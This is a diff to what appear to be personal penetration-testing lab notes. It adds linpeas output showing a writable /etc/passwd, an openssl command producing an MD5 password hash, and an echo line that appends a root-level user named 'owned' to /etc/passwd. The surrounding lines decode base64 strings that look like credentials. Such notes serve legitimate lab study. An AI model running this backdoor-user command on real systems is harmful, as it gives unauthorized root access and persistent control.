@@ -181,6 +181,16 @@ serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
 echo -n "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d
 echo -n "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 -d
 
+# linpeas
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                
+                                                                                                                                                            
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ /etc/passwd is writable                
+
+# passwd 생성
+openssl passwd -1 -salt password password 
+echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
 
 ```
 ### Bratarina
